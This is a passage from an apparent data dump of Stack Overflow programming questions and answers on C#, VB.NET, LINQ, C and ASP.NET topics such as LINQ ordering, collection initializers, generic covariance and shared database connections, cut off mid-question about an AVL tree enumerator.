Option Infer On
</code></pre>

<p>in your project settings.</p>

<p>Other than that, not much can be done. VB.NET is a different language and has different kind of restrictions from C#. If you want to make it exactly like C#, why wouldn't you simply switch to C#?</p>
"
"<p>Here is my LINQ query:</p>

<pre><code>(from o in entities.MyTable
orderby o.MyColumn
select o.MyColumn).Distinct();
</code></pre>

<p>Here is the result:</p>

<pre><code>{""a"", ""c"", ""b"", ""d""}
</code></pre>

<p>Here is the generated SQL:</p>

<pre><code>SELECT 
[Distinct1].[MyColumn] AS [MyColumn]
FROM ( SELECT DISTINCT 
    [Extent1].[MyColumn] AS [MyColumn]
    FROM [dbo].[MyTable] AS [Extent1]
)  AS [Distinct1]
</code></pre>

<p>Is this a bug?  Where's my ordering, damnit?</p>
","33708","","<p>You should sort <em>after</em> <code>Distinct</code> as it doesn't come with any guarantee about preserving the order:</p>

<pre><code>entities.MyTable.Select(o =&gt; o.MyColumn).Distinct().OrderBy(o =&gt; o);
</code></pre>
"
"<p>I'm rather new to these could someone explain the significance (of the following code) or perhaps give a link to some useful information on lambda expressions? I encounter the following code in a test and I am wondering why someone would do this:</p>

<pre><code>foo.MyEvent += (o, e) =&gt; { fCount++; Console.WriteLine(fCount); };

foo.MyEvent -= (o, e) =&gt; { fCount++; Console.WriteLine(fCount); };
</code></pre>

<p>My instinct tells me it is something simple and not a mistake, but I don't know enough about these expressions to understand why this is being done.</p>
","33708","","<p>The lambda expression <code>(o, e) =&gt; { fCount++; Console.WriteLine(fCount); }</code> is interpreted as an <em>anonymous method</em> that takes two arguments <code>o, e</code> (whose types are inferred from the delegate type used for <code>MyEvent</code> and returns <code>void</code>. It <a href=""http://stackoverflow.com/questions/1095707/what-is-the-exact-definition-of-a-closure/1095770#1095770""><em>captures</em></a> the <code>fCount</code> variable in the body of the enclosing method (if it's a local variable). The <code>+=</code> operator will subscribe the anonymous method to the event and the <code>-=</code> unsubscribes a delegate from an event.</p>

<hr>

<h3>Update (re: concerns about delegate instance equality):</h3>

<p>It's important to know that it's not a good idea to try to unsubscribe from the event like that. The language specification, permits, but doesn't require that the delegate in the second line to be equal to the delegate from the first line. That is, the compiler is allowed to treat the two anonymous function bodies as if it was the same function or if it wasn't (because the anonymous function body is semantically identical and the set of captured variables is equal too). Even if it works as expected in your compiler, it might break in the next version. To quote the C# Language Specification on that:</p>

<blockquote>
  <h3>C# Language Specification (Section 7.9.8 Delegate equality operators):</h3>
  
  <p>Invocation list entries produced from evaluation of semantically identical <em>anonymous-function-expressions</em> with the same (possibly empty) set of captured outer variable instances are permitted (but not required) to be equal.</p>
</blockquote>

<p>If the compiler treats the two anonymous function expressions as equal, the second line will unsubscribe the previous anonymous method from the event. If it doesn't the second line will not do anything special (it's not an error to unsubscribe a delegate from an event invocation list if it doesn't already exist in the list).</p>
"
"<p>I just want to understand why I cannot create a protected enum on C#?</p>

<p>The compiler refuses to accept that</p>

<p>Does anyone know why that may be?</p>
","33708","","<p>You <strong>can</strong> create an <code>enum</code> with <code>protected</code> access modifier <strong>if it's a nested type</strong>. Types created directly in a <code>namespace</code> can only assume <code>public</code> and <code>internal</code> access modifiers. It doesn't make sense to create a <code>private</code>, <code>protected</code>, or <code>protected internal</code> type directly in a <code>namespace</code> since you wouldn't be able to use it anywhere (since you can't inherit from a namespace or declare methods in it).</p>
"
"<p>For the longest time I've been curious to code directly in Intermediate Language as an academic endeavour, to gain a better understanding of what's happening ""under the hood"".</p>

<p>Does anybody provide Visual Studio support for *IL in the form of: project templates, IntelliSense and RAD tool integration?</p>

<p><strong>Edits</strong>: I don't mean restricted to out-of-the-box features. For example, I can download Visual Studio extensions to support <a href=""http://ironpython.net/"" rel=""nofollow"">Python</a>, <a href=""http://www.netcobol.com/products/Fujitsu-NetCOBOL-for-.NET/overview"" rel=""nofollow"">COBOL</a>, etc. Looking for the same for *IL.</p>

<p>There is a stand-alone <a href=""http://msdn.microsoft.com/en-us/library/496e4ekx%28VS.80%29.aspx"" rel=""nofollow"">Intermediate Assembler</a> tool so the ability to code and compile it already exists outside Visual Studio.</p>
","33708","","<p>Not a ""real"" support per se, but you <em>can</em> get <code>ilasm</code> to generate PDB files out of <code>.il</code> files when it builds the assembly. You'll be able to use Visual Studio to debug the assembly, set breakpoints, ....</p>
"
"<p>I'm working on a .NET 3.5 console application in C# which uses a VC++ unmanaged DLL. It ran without a problem when I worked on it a few weeks ago, but I'm coming back to it today and am now getting a BadImageFormatException (""An attempt was made to load a program with an incorrect format. (Exception from HRESULT: 0x8007000B)).</p>

<p>My development workstation is running 64bit Windows 7, and I do a fair amount of work with unmanaged code, so I immediately checked that the .NET assembly and the VC++ library both had x86 targets. They did. </p>

<p>Just to be sure, I cleaned and rebuilt the VC++ library and the .NET assembly, to no avail. </p>

<p>Neither system is doing anything particularly unusual. The VC++ library loads a binary data file and does some mathematical processing on its contents. The .NET assembly has the DllImports for the library and some code to wire it up. This all worked a few weeks ago.</p>

<p>So now I'm left wondering if there's some other cause of BadImageFormatException that's less common than an x86/x64 conflict that I might be running into.</p>

<p>Thanks.</p>

<p>EDIT: I get the same error regardless of x86 or x64 mode, but when set to 'Any CPU', execution gets past that point, but execution aborts on a later call to the VC++ library with no exception. Regardless of whether that is related to this problem, is there something that 'Any CPU' does differently from both x86 and x64 which could shed some light on this?</p>
","33708","","<p>You may be trying to load an assembly built for CLR 4.0 on CLR 2.0. </p>
"
"<p>I need to create a class that also initializes two event lists to new empty lists. I'm not sure if that is what is being asked of me, but I know how to create a list and how to create a constructor.  I created 2 lists, and now I should create the constructor. Here is one of my lists:</p>

<pre><code>List&lt;Person&gt; organize = new List&lt;Person&gt;();
</code></pre>

<p>How do I initialize the two event lists in the constructor to new lists?</p>
","33708","","<p>If your list is declared as a <em>field</em> (member variable directly inside the class) and it's initialized at its declaration, you shouldn't to reinitialize it in the constructor. The initialization expression will get moved to the constructor by the compiler automatically.</p>
"
"<p>I am currently learning C# and LINQ. I have lots of questions about them. Basically, I need a step by step tutorial.</p>

<ol>
<li><p>I suppose the <code>dbml</code> file is the configuration file of the database. If I double click the <code>dbml</code> file VS will open it in a design diagram. Can I create/delete/modify tables here? I can use <code>add new item</code> to add the <code>LINQ to SQL Classes</code> to get a <code>dbml</code> file?</p></li>
<li><p>What's next? Generate tables in database? Generate SQL script? Generate cs files? When? How?</p></li>
</ol>
","33708","","<p>The DBML file is not related to the database server at all. It's a completely client side thing. It's essentially a set of information about your tables in the database and how you're going to map them to .NET objects. </p>

<p>Of course, you can drag a table from a database and have Visual Studio infer some information for you automatically, but changing the file will not affect the database. You can create a DBML file from scratch without any database too.</p>

<p>Internally, the DBML file is simply an XML file that's fed into a custom tool by Visual Studio and generates <code>.cs</code> files representing the LINQ object model for your database from it.</p>
"
"<p>Classes that implement <code>IEnumerable</code> and provide a <code>public void Add(/* args */)</code> function can be initialized like in the following example:</p>

<pre><code>List&lt;int&gt; numbers = new List&lt;int&gt;{ 1, 2, 3 };
</code></pre>

<p>which calls the <code>Add(int)</code> function 3x after initializing the <code>List&lt;int&gt;</code>.</p>

<p>Is there a way to define this behavior explicitly for my own classes? For example, could I have the initializer call a function other than the appropriate <code>Add()</code> overload?</p>
","33708","","<p>No, the compiler requires a method named <code>Add</code> for the collection initializer to work. This is defined in C# specification and cannot be changed:</p>

<blockquote>
  <h3>C# Language Specification - 7.5.10.3 Collection Initializers</h3>
  
  <p>The collection object to which a collection initializer is applied must be of a type that implements <code>System.Collections.IEnumerable</code> or a compile-time error occurs. For each specified element in order, the collection initializer invokes an <code>Add</code> method on the target object with the expression list of the element initializer as argument list, applying normal overload resolution for each invocation. Thus, <strong><em>the collection object must contain an applicable <code>Add</code> method</em></strong> for each element initializer. <em>[emphasis mine]</em></p>
</blockquote>

<p>Of course, the <code>Add</code> method can take more than one argument (like <code>Dictionary&lt;TKey, TValue&gt;</code>):</p>

<pre><code>dic = new Dictionary&lt;int, int&gt; { 
    { 1, 2 },
    { 3, 4 }
};
// translated to:
dic = new Dictionary&lt;int, int&gt;();
dic.Add(1, 2);
dic.Add(3, 4);
</code></pre>
"
"<p>Say, for instance, I have a class:</p>

<pre><code>public class MyFoo : IMyBar
{
    ...
}
</code></pre>

<p>Then, I would want to use the following code:</p>

<pre><code>List&lt;MyFoo&gt; classList = new List&lt;MyFoo&gt;();
classList.Add(new MyFoo(1));
classList.Add(new MyFoo(2));
classList.Add(new MyFoo(3));

List&lt;IMyBar&gt; interfaceList = new List&lt;IMyBar&gt;(classList);
</code></pre>

<p>But this produces the error: </p>

<pre><code>`Argument '1': cannot convert from 'IEnumerable&lt;MyFoo&gt;' to 'IEnumerable&lt;IMyBar&gt;' 
</code></pre>

<p>Why is this? Since MyFoo implements IMyBar, one would expect that an IEnumerable of MyFoo could be treated as an IEnumerable of IMyBar. A mundane real-world example being producing a list of cars, and then being told that it wasn't a list of vehicles.</p>

<p>It's only a minor annoyance, but if anyone can shed some light on this, I would be much obliged.</p>
","33708","","<p>This is going to work in C# 4.0! What you are talking about is called <em>generic covariance</em>.</p>

<p>In the meantime you can use the <a href=""http://msdn.microsoft.com/en-us/library/bb341406.aspx"" rel=""nofollow""><code>Cast</code> extension method</a>:</p>

<pre><code>List&lt;IMyBar&gt; interfaceList = new List&lt;IMyBar&gt;(classList.Cast&lt;IMyBar&gt;());
</code></pre>
"
"<p>In C++, if you need to have 2 objects modified, you can pass by reference. How do you accomplish this in java? Assume the 2 objects are primitive types such as int. </p>
","33708","","<p>You can't. Java doesn't support passing references to variables. Everything is passed by value.</p>

<p><em>Of course, when a reference to an object is passed by value, it'll point to the same object, but <strong>this is not calling by reference</strong>.</em></p>
"
"<p>Consider I have a shared function:-</p>

<pre><code>Public Shared Function CalculateAreaFromRadius(ByVal radius As Double) As Double

    ' square the radius...
    Dim radiusSquared As Double
    radiusSquared = radius * radius

    ' multiply it by pi...
    Dim result As Double
    result = radiusSquared * Math.PI

    'Wait a bit, for the sake of testing and 
    'simulate another call will be made b4 earlier one ended or such
     for i as Integer = 0 to integer.Max
     Next

    ' return the result...
    Return result

End Function
</code></pre>

<p>My Questions:</p>

<ol>
<li><p>If I have two or more threads in the same vb .net app and each of them calls the shared function at the same time with different RADIUS, will they each get their own AREA? </p></li>
<li><p>I want to know for each call to the function if it is using same local variables or each call creates new instances of local variables?</p></li>
<li><p>Will the answers to above questions be same If I have multiple (2+) single threaded apps and they all call the function at the same time with different RADIUS value?</p></li>
</ol>

<p>I will appreciate your reponse. Thank you.</p>
","33708","","<p>The function uses <strong>no external state</strong>. It's only accessing its local variables so it's perfectly safe to call it from different threads.</p>

<ol>
<li>Yes</li>
<li>Local variables are specific to the specific call regardless of the thread the function is running on (think about a recursive function; each time you call the function, it'll have a distinct set of local variables).</li>
<li>Yes</li>
</ol>
"
"<p>I want to use this line of code:</p>

<pre><code>using (ADataContext _dc = new ADataContext(ConnectionString), BDataContext _dc2 = new BrDataContext(ConnectionString)){ // ...}
</code></pre>

<p>This gives a compile error:</p>

<blockquote>
  <p>Cannot use more than one type in a
  for, using, fixed or declartion
  statement.</p>
</blockquote>

<p>I thought this was possible? MSDN says it is: <a href=""http://msdn.microsoft.com/en-us/library/yh598w02%28VS.80%29.aspx"">http://msdn.microsoft.com/en-us/library/yh598w02%28VS.80%29.aspx</a>
In the MSDN sample code Font is used, which is class and thereby a reference type as well as my two DataContext classes.</p>

<p>What went wrong here? How does my attempt differ from the MSDN sample?</p>
","33708","","<p>The <code>using</code> resource acquisition statement can be a declaration.  A declaration can only declare variables of <em>one</em> type. </p>

<p>You can do:</p>

<pre><code>using (TypeOne t = something, t2 = somethingElse) { ... }
// Note that no type is specified before `t2`. Just like `int a, b`
</code></pre>

<p>but you can't</p>

<pre><code>using (TypeOne t = something, TypeTwo t2 = somethingElse) { ... }
</code></pre>
"
"<p>I've been tasked with porting an existing Windows GUI app to Linux.  Ideally, I'd like to do this so the same code base can be used to build either the Windows version or the Linux version.  I'll be doing my work on Ubuntu 9.04.  After searching around, it's unclear to me what tools are best suited to help me with this.  </p>

<p>A list of loose requirements would be:  </p>

<ol>
<li><p>The code is in C, not C++, and should compile to build both Windows and Linux versions. Since it's existing code, and fairly large, converting to a managed language like .NET is out of the question for now.  </p></li>
<li><p>I would prefer if I can use the same dialogs in both systems. In Windows, putting up a dialog is pretty simple. You build the dialog in the Resource Editor in Visual Studio, then call DialogBox() API, and handle the event messages.  I would really like to find something that can do the equivalent on the Linux side.  </p></li>
<li><p>It would also be nice to have a good IDE similar to Visual Studio.  </p></li>
</ol>

<p>Any helps or hints would be appreciated.<br>
Thanks,</p>
","33708","","<p>Since your code base is in C, I'd suggest using <a href=""http://www.gtk.org/"" rel=""nofollow"">GTK+</a>. It's a cross platform GUI toolkit. For instance, Pidgin instant messenger GUI is created with GTK+. <a href=""http://glade.gnome.org/"" rel=""nofollow"">Glade</a> user interface designer can be used to graphically design UIs.</p>
"
"<p>I was wondering how you could take 1 string, split it into 2 with a delimiter, such as space, and assign the 2 parts to 2 separate strings.  I've tried using strtok(); but to no avail. </p>

<p>Thanks!</p>

<p>Mr. Man</p>
","33708","","<p>If you're open to changing the original string, you can simply replace the delimiter with <code>\0</code>. The original pointer will point to the first string and the pointer to the character after the delimiter will point to the second string. The good thing is you can use both pointers at the same time without allocating any new string buffers.</p>
"
"<p>I am having to deal with raw bytes in a project and I need to basically do something like this</p>

<pre><code>byte[] ToBytes(){
  byte[] buffer=new byte[somelength];
  byte[] tmp;
  tmp=BitConverter.GetBytes(SomeShort);
  buffer[0]=tmp[0];
  buffer[1]=tmp[1];
  tmp=BitConverter.GetBytes(SomeOtherShort);
  buffer[2]=tmp[0];
  buffer[3]=tmp[1];
}
</code></pre>

<p>I feel like this is so wrong yet I can't find any better way of doing it. Is there an easier way? </p>
","33708","","<p>You don't need to initialize <code>tmp</code> to a new array. <code>BitConverter.GetBytes</code> creates a new array and returns it for you. There's not much you can do about <code>GetBytes</code> but you can use methods like <a href=""http://msdn.microsoft.com/en-us/library/system.buffer.blockcopy.aspx"" rel=""nofollow""><code>Buffer.BlockCopy</code></a> to simplify the copy operation.</p>

<p>If you're not doing this in a performance-critical piece of code, you can go a bit LINQy and do things like:</p>

<pre><code>IEnumerable&lt;byte&gt; bytes = BitConverter.GetBytes(first);
bytes = bytes.Concat(BitConverter.GetBytes(second));
bytes = bytes.Concat(BitConverter.GetBytes(third));
// ... so on; you can chain the calls too
return bytes.ToArray();
</code></pre>
"
"<p>The compiler, given the following code, tells me ""Use of unassigned local variable 'x'.""  Any thoughts?</p>

<pre><code>public delegate Y Function&lt;X,Y&gt;(X x);

public class Map&lt;X,Y&gt;
{
    private Function&lt;X,Y&gt; F;

    public Map(Function f)
    {
        F = f;
    }

    public Collection&lt;Y&gt; Over(Collection&lt;X&gt; xs){
        List&lt;Y&gt; ys = new List&lt;Y&gt;();
        foreach (X x in xs)
        {
            X x2 = x;//ys.Add(F(x));
        }
        return ys;
    }
}
</code></pre>
","33708","","<p>The language specification defines <code>foreach</code> statement as the equivalent of a <code>while</code> loop, in which the loop variable is assigned to the <code>Current</code> property of the enumerator object. This definitely satisfies the definite assignment rules of any conforming C# compiler for that code snippet. Either you're using a non-conforming compiler or the error is from somewhere else.</p>
"
"<p>i want to compare two times in vb.net i.e</p>

<p>i have 1:42:21 PM and i want it to compare with  TimeOfDay in vb.net how can i do that....</p>
","33708","","<pre><code>New DateTime(1, 1, 1, 13, 42, 21) &gt; TimeOfDay
</code></pre>

<p>Or you can enclose a <code>DateTime</code> expression in <code>#</code> signs:</p>

<pre><code>TimeOfDay &gt; #1:42:21 PM#
</code></pre>
"
"<p>How to split an <code>IEnumerable</code> of <code>IEnumerables</code> to one flat <code>IEnumerable</code> using <code>LINQ</code> (or someway else)?</p>
","33708","","<pre><code>enumerable.SelectMany(x =&gt; x)
</code></pre>
"
"<p>Are there any best-practices that state custom code shouldn't be placed in a <code>System</code> namespace? Should <code>System</code> and its children be reserved for Microsoft code?</p>

<p>I ask because I'm writing a class library that will be used across many projects and I'd like to keep things consistent by placing it in <code>System.InteropServices</code> (since it deals with P/Invoke).</p>
","33708","","<p>It's not a good idea because it defeats one of the primary benefits of namespaces: preventing name clashes. What if a newer version of the framework introduced an identically named type in that namespace? </p>

<p>This is particularly bad for <code>System</code> namespaces since they are imported in many other pieces of code with <code>using</code> directives and introducing custom types in those namespaces pollutes the naming scope of other source files with unexpected identifiers. </p>

<p>To categorize your custom interop related types, you can create a new namespace like <code>MyProduct.InteropServices</code>.</p>
"
"<p>Today I found the following:</p>

<pre><code>#include &lt;stdio.h&gt;

int main(){
char x = 255;
int z = ((int)x)*2;

printf(""%d\n"", z); //prints -2

return 0;

}
</code></pre>

<p>So basically I'm getting an overflow because the size limit is determined by the operands on the right side of the = sign??</p>

<p>Why doesn't casting it to int before multiplying work?</p>

<p>In this case I'm using a char and int, but if I use ""long"" and ""long long int"" (c99), then I get similar behaviour. Is it generally advised against doing arithmetic with operands of different sizes?</p>
","33708","","<p>No, you are not getting an overflow on the second line (multiplication). The problem is your compiler is using <code>signed char</code> by default and 255 overflows and will mean -1. Basically, you are initializing variable <code>x</code> with the value of -1. Casting -1 to int will result in -1 (<code>signed</code> operands will get sign-extended in upcasts whereas <code>unsigned</code> operands will get zero-extended).</p>

<p>You can force the <code>char</code> to be <code>unsigned</code> by adding the <code>unsigned</code> prefix:</p>

<pre><code>unsigned char x = 255;
</code></pre>
"
"<p>I have a linq to objects query in a recursive loop and afraid when the objects approach more then 1000 and a have more then 100 users on the site -- my website will break. so is it possible to compile a linq to objects query. </p>

<p>The linq query does nothing more then find the direct children of a node. </p>
","33708","","<p>To see why the concept of <em>compilation</em> doesn't really make sense for LINQ to Object queries, it's useful to understand how LINQ is implemented.  First, it should be clear that LINQ queries written in fluent syntax are converted to the equivalent method call syntax at <em>compile time</em> by the C# compiler regardless of the variant of LINQ you're using:</p>

<pre><code>from person in people
where person.Age &lt; 18
select person.Name
// will be converted to:
people.Where(person =&gt; person.Age &lt; 18).Select(person =&gt; person.Name)
</code></pre>

<p>From now on, the LINQ query is basically a set of method calls taking some arguments and usually transforming an <code>IEnumerable&lt;T&gt;</code> object to another <code>IEnumerable&lt;T&gt;</code> object. Deferred execution, which is a different from compilation, is simply achieved by not taking any object from the original <code>IEnumerable&lt;T&gt;</code> until you're traversing the output <code>IEnumerable&lt;T&gt;</code>. Basically, methods with deferred execution are operating on their arguments symbolically without touching the original collection, building up a generator that queries stuff as you like.</p>

<p>With that in mind, take a look at the lambda expression <code>person =&gt; person.Age &lt; 18</code> in the above expression. It takes a <code>Person</code> object and returns a <code>bool</code>. Lambda expressions are untyped; they can be treated as expression trees or anonymous methods depending on the context their type is inferred from. In this case, the type is inferred from the parameter type of the <code>Where</code> extension method. This is where the distinction of LINQ to SQL and LINQ to Object comes up. In LINQ to Objects, the <code>Where</code> method simply takes <code>Func&lt;Person, bool&gt;</code> as opposed to <code>Expression&lt;Func&lt;Person, bool&gt;&gt;</code>. This essentially means that in LINQ to Objects, the C# compiler compiles the lambda expression down to an anonymous method and generates the IL at <em>compile time</em> and passes a delegate to that method to <code>Where</code>. </p>

<p>In other LINQ flavors, like LINQ to SQL, the lambda is <em>not</em> compiled to IL. Instead, the compiler builds up an expression tree object out of the lambda expression and passes the expression tree to LINQ methods. LINQ methods use these expression trees to build up a model for querying stuff. When the query is being run, the object model built to represent the query using the expression trees will be transformed to another thing (depending on the LINQ variant used) like SQL statements in LINQ to SQL in order to get executed on the database. This transformation process is done at runtime and it's what we call <em>compilation of LINQ queries</em>. </p>

<p>To sum up, the question is compile to <em>what</em>? The reason LINQ to Object doesn't need compilation at runtime is that it's not in expression tree format in the first place; it's already IL.  </p>

<p>You almost never need to worry about the performance of LINQ to Objects in comparison to normal looping.</p>
"
"<p>I'm trying to secure my entire MVC site, so before the Home controller, I added an [Authorize] attribute.</p>

<p>Now if you run it from Visual Studio or navigate using the root URL (e.g. <a href=""http://localhost:2897"" rel=""nofollow"">http://localhost:2897</a>)  it does redirect to the login page, as expected. However the URL in the address bar after redirection looks like this: <a href=""http://localhost:2897/Account/LogOn?ReturnUrl=%2fdefault.aspx%3f"" rel=""nofollow"">http://localhost:2897/Account/LogOn?ReturnUrl=%2fdefault.aspx%3f</a></p>

<p>I haven't tested this out, seeing as I have not implemented my authentication code. However, this looks like a big problem to me, since I do not have a default.aspx in my project!</p>

<p>My authentication tag in the web.config looks like this:</p>

<pre><code>&lt;authentication mode=""Forms""&gt;
   &lt;forms loginUrl=""~/Account/LogOn"" defaultUrl=""~/Home/Index"" timeout=""2880""/&gt;
&lt;/authentication&gt;
</code></pre>

<p>Why doesn't it pick up this route as the default ReturnUrl instead of default.aspx?</p>
","33708","","<p>ASP.NET (to be precise, <code>FormsAuthentication.RedirectFromLoginPage</code>) always ignores the <code>defaultUrl</code> setting in <code>web.config</code> when a <code>ReturnUrl</code> parameter is present. It's only honored when you go directly to the login page without passing any <code>ReturnUrl</code> parameters.</p>

<p>ASP.NET MVC project template provides a blank <code>Default.aspx</code> template to handle requests like that in IIS Classic pipeline mode. You should be fine with that.</p>
"
"<p>I'm facing a situation where I have dependent objects and I would like to be able to remove an object and all references to it.</p>

<p>Say I have an object structure like the code below, with a Branch type which references two Nodes. </p>

<pre><code>public class Node
{
    // Has Some Data!
}

public class Branch
{
    // Contains references to Nodes
    public Node NodeA
    public Node NodeB
}

public class Graph
{
    public List&lt;Node&gt; Nodes;
    public List&lt;Branch&gt; Branches;
}
</code></pre>

<p>If I remove a Node from the Nodes list in the Graph class, it is still possible that one or more Branch objects still contains a reference to the removed Node, thus retaining it in memory, whereas really what I would quite like would be to set any references to the removed Node to null and let the garbage collection kick in.</p>

<p>Other than enumerating through each Branch and checking each Node reference sequentially, are there any smart ideas on how I remove references to the Node in each Branch instance AND indeed any other class which reference the removed Node? </p>
","33708","","<p>There's no built-in C# language feature to facilate that (you can't really track assignments). You'll have to keep track of all references somewhere and update it as soon as you're assigning a new reference to it. A very general idea is to provide a <code>Removed</code> event in the <code>Node</code> itself and raise the event when the object is supposed to be abandoned. Every time you want to hold on a new reference to the <code>Node</code>, you'd subscribe to the event with a matching delegate that nulls out the reference to that object. 
Of course, if you're doing this with a set of previously known types that reference the node in a specific way, there may be easier and more efficient ways to accomplish the task.</p>
"
"<p>Hi <br >
I've published my new website , In my computer it works fine and no problem , But in the Server I when some user connect at the same time it crash .<br >
I found out There is a error at this Method :</p>

<pre><code>public static DbDataReader ExecuteReader(DbCommand dbCommand, CommandBehavior commandBehavior)
{
    if (dbConnection.State != ConnectionState.Open)
        dbConnection.Open();
    return dbCommand.ExecuteReader(commandBehavior);
}
</code></pre>

<p>When i trace it , It says ConnectionState is not open , and  it's doing opening . Here are my questions :<br/>
1- Is it a problem if while ConnectionState is doing opening , we Open the connection again ? <br/>
2- What I've missed , that i receive this error ?</p>

<p><br ></p>

<p><strong>Edit</strong> <br >
For more information I past some part of my code here :</p>

<pre><code>public class DbProviderHelper
    {
        private static DbProviderFactory dbProviderFactory;

        private static DbConnection dbConnection;

        #region dbConnexion

        public static DbConnection GetConnection()
        {
            if (dbConnection == null)
            {
                ConnectionStringsSection connectionStringsSection = GetConnectionStringsSection();
                dbProviderFactory = DbProviderFactories.GetFactory(connectionStringsSection.ConnectionStrings[1].ProviderName);
                dbConnection = dbProviderFactory.CreateConnection();
                dbConnection.ConnectionString = connectionStringsSection.ConnectionStrings[1].ConnectionString;
            }
            return dbConnection;
        }
        public static ConnectionStringsSection GetConnectionStringsSection()
        {
            return ConfigurationManager.GetSection(""connectionStrings"") as ConnectionStringsSection;
        }

        #endregion dbConnexion

        #region  dbCommand

        public static DbCommand CreateCommand(String commandText, CommandType commandType)
        {
            DbCommand dbCommand = dbProviderFactory.CreateCommand();
            dbCommand.Connection = dbConnection;
            dbCommand.CommandType = commandType;
            dbCommand.CommandText = commandText;


            return dbCommand;
        }

        #endregion  dbCommand

        #region dbParameter

        public static DbParameter CreateParameter(string parameterName, DbType dbType, object value)
        {
            DbParameter oDbParameter = dbProviderFactory.CreateParameter();
            oDbParameter.ParameterName = parameterName;
            oDbParameter.DbType = dbType;
            oDbParameter.Value = value;

            return oDbParameter;
        }

        #endregion dbParameter

        #region Operations

        public static DbDataReader ExecuteReader(DbCommand dbCommand)
        {
            if (dbConnection.State != ConnectionState.Open)
                dbConnection.Open();
            return dbCommand.ExecuteReader(CommandBehavior.CloseConnection);
        }
        public static int ExecuteNonQuery(DbCommand dbCommand)
        {
            try
            {
                if (dbConnection.State != ConnectionState.Open)
                    dbConnection.Open();
                return dbCommand.ExecuteNonQuery();
            }
            catch (Exception ex)
            {
                throw ex;
            }
            finally
            {
                dbConnection.Close();
            }
        }
        #endregion Operations

    }
</code></pre>

<p>And i invote that like :</p>

<pre><code>public class Configuration
{
    public Configuration()
    {
        DbProviderHelper.GetConnection();
    }
    public DbDataReader GetTabsParent(int tabId)
    {
        DbCommand oDbCommand = DbProviderHelper.CreateCommand(""Portal_TabsGetParent"", CommandType.StoredProcedure);
        oDbCommand.Parameters.Add(DbProviderHelper.CreateParameter(""@TabID"", DbType.Int32, tabId));
        DbDataReader oDbDataReader = DbProviderHelper.ExecuteReader(oDbCommand);
        return oDbDataReader;
    }
}
</code></pre>
","33708","","<blockquote>
  <p>Is it a problem if while ConnectionState is doing opening , we Open the connection again? </p>
</blockquote>

<p>Yes, it can throw an exception.</p>

<p>Straight from <a href=""http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlconnection.open.aspx"" rel=""nofollow"">MSDN: SqlConnection.Open method</a></p>

<blockquote>
  <p><code>InvalidOperationException</code>:<br>
  Cannot open a connection without specifying a data source or server.<br>
  or<br>
  The connection is already open</p>
</blockquote>

<p>(are you executing the method on different threads with a single shared connection?)</p>
"
"<p>When I type in the foll. code, I get the output as 1073741823.</p>

<pre><code>#include &lt;iostream&gt;
#include &lt;vector&gt;
using namespace std;
int main()
{
  vector &lt;int&gt; v;
  cout&lt;&lt;v.max_size();
  return 0;
}
</code></pre>

<p>However when I try to resize the vector to 1,000,000,000, by <code>v.resize(1000000000);</code> the program stops executing. How can I enable the program to allocate the required memory, when it seems that it should be able to?</p>

<p>I am using MinGW in Windows 7. I have 2 GB RAM. Should it not be possible?
In case it is not possible, can't I declare it as an array of integers and get away? BUt even that doesn't work.</p>

<p>Another thing is that, suppose I would use a file(which can easily handle so much data ).
How can I let it read and write and the same time.
Using <code>fstream file(""file.txt', ios::out | ios::in );</code> doesn't create a file, in the first place. But supposing the file exists, I am unable to use to do reading and writing simultaneously.
WHat I mean is this :
Let the contents of the file be <code>111111</code>
Then if I run : -</p>

<pre><code>#include &lt;fstream&gt;
#include &lt;iostream&gt;
using namespace std;
int main()
{
  fstream file(""file.txt"",ios:in|ios::out);
  char x;
  while( file&gt;&gt;x)
  {
    file&lt;&lt;'0';
  }
 return 0;
}
</code></pre>

<p>Shouldn't the file's contents now be <code>101010</code> ? Read one character and then overwrite the next one with 0 ? Or incase the entire contents were read at once into some buffer, should there not be atleast one 0 in the file ? <code>1111110</code> ?
But the contents remain unaltered. Please explain.
Thank you.</p>
","33708","","<ol>
<li><p>A 32-bit process can only address 4GB address space at a single time. Usually, plenty of this 4GB address space is used to map other stuff. Your vector is going to take too much contiguous address space (4 billion bytes) which is not likely to be available.</p></li>
<li><p>You should <a href=""http://en.wikipedia.org/wiki/Memory-mapped_file"">memory map the file</a>. See <a href=""http://www.opengroup.org/onlinepubs/000095399/functions/mmap.html""><code>mmap</code></a>.</p></li>
</ol>
"
"<p>Does iPad or iPhone support OpenGL ES 2.0? How about iPhone os 4.0. Is this supported by the OS or the hardware?</p>

<p>And can anyone recommend some books on OpenGL ES development on iPad or iPhone?</p>

<p>Thanks!</p>
","33708","","<p>Yes, iPhone 3GS, 3rd generation iPod touch, and iPad all support OpenGL ES 2.0 (e.g. shaders and programmable pipeline).</p>

<p>iPhone OS provides the required software APIs and dependencies and the hardware graphics chip supports the required functionality too. </p>
"
"<p>First of all I don't know if it this question belongs here if not please tell me.</p>

<p>I've recently evolved from freelancer to a small .net/php development shop and we're trying to figure out what the best tools for team development will be (code repository, continuous integration server, automated testing, etc.).</p>

<p>Do you have some recommendations, preferably open source or low cost since we are starting out. (We already have visual studio for all the team members).</p>
","33708","","<p>You may want to take a look at <a href=""http://www.microsoft.com/WEB/websitespark/"" rel=""nofollow"">Microsoft WebsiteSpark</a>:</p>

<blockquote>
  <p>Does your company have 10 or fewer employees? 
  Receive Windows Web Server and SQL Server Web Edition at no cost to host new websites<br>
  *A one-time $100 Program Offering Fee is due upon exit or at the end of the 3 year term.</p>
</blockquote>
"
"<p>How can I retrieve the value of the only item I have an a Dictionary (C#) in one line?  Is this possible?</p>
","33708","","<pre><code>dictionary.Single().Value
</code></pre>

<p><code>Single</code> throws an exception if the dictionary doesn't contain exactly one element (if you don't like this behavior, use <code>First()</code> instead). If you're sure you're going to put a single item in a dictionary, why aren't you simply using a variable?</p>
"
"<p>I'm working on an AVL Tree. The tree itself seems to be working but I need a iterator to walk through the values of the tree. Therefore I tried to implement the IEnumerator interace. Unfortunately I get a compile time error implementing IEnumerator and IComparable. First the code and below that the error.</p>

<pre><code>class AvlTreePreOrderEnumerator&lt;T&gt; : IEnumerator&lt;T&gt; where T :IComparable&lt;T&gt;
{
    private AvlTreeNode&lt;T&gt; current = default(T);
    private AvlTreeNode&lt;T&gt; tree = null;
    private Queue&lt;AvlTreeNode&lt;T&gt;&gt; traverseQueue = null;

    public AvlTreePreOrderEnumerator(AvlTreeNode&lt;T&gt; tree)
    {
        this.tree = tree;

        //Build queue
        traverseQueue = new Queue&lt;AvlTreeNode&lt;T&gt;&gt;();
        visitNode(this.tree.Root);
    }

